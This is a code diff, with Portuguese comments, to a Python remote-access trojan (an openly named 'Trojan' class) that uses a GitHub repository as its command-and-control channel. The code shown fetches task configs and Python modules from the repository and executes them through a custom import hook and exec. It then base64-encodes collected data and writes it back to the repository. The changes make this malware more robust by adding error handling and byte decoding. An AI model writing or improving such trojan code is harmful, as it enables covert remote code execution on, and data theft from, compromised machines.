@@ -18,8 +18,12 @@ def github_connect():
 
 # Função para recuperar o conteúdo de um arquivo de um diretório específico no repositório do GitHub
 def get_file_contents(dirname, module_name, repo):
-    file = repo.get_contents(f'{dirname}/{module_name}')
-    return file.decoded_content.decode()
+    try:
+        file = repo.get_contents(f'{dirname}/{module_name}')
+        return file.decoded_content
+    except Exception as e:
+        print(f"Erro ao acessar o arquivo {dirname}/{module_name}: {e}")
+        return None
 
 # Classe representando o Trojan
 class Trojan:
@@ -31,8 +35,17 @@ class Trojan:
 
     def get_config(self):
         try:
-            config_json = get_file_contents('config', self.config_file, self.repo)
-            config = json.loads(base64.b64decode(config_json))
+            config_bytes = get_file_contents('config', self.config_file, self.repo)
+            if config_bytes is None:
+                return []
+            # Tenta decodificar como UTF-8
+            try:
+                config_json = config_bytes.decode('utf-8')
+            except UnicodeDecodeError:
+                # Se falhar, tenta decodificar como base64
+                config_json = base64.b64decode(config_bytes).decode('utf-8')
+
+            config = json.loads(config_json)
             for task in config:
                 if task['module'] not in sys.modules:
                     exec(f"import {task['module']}")
@@ -52,7 +65,10 @@ class Trojan:
         try:
             message = datetime.now().isoformat()
             remote_path = f'data/{self.id}/{message}.data'
-            bindata = base64.b64encode(bytes(f'{data}', 'utf-8'))
+            # Certifique-se de que os dados são bytes
+            if not isinstance(data, bytes):
+                data = bytes(f'{data}', 'utf-8')
+            bindata = base64.b64encode(data)
             self.repo.create_file(remote_path, message, bindata.decode())
         except Exception as e:
             print(f"Erro ao armazenar resultado: {e}")
@@ -77,10 +93,10 @@ class GitImporter:
         try:
             new_library = get_file_contents('modules', f'{fullname}.py', self.repo)
             if new_library is not None:
-                self.current_module_code = new_library
+                self.current_module_code = new_library.decode('utf-8')  # Decodifica como UTF-8
                 return importlib.util.spec_from_loader(fullname, loader=self)
         except Exception as e:
-            print(f"[*] Módulo {fullname} não encontrado no repositório.")
+            print(f"[*] Módulo {fullname} não encontrado no repositório: {e}")
             return None
 
     def create_module(self, spec):
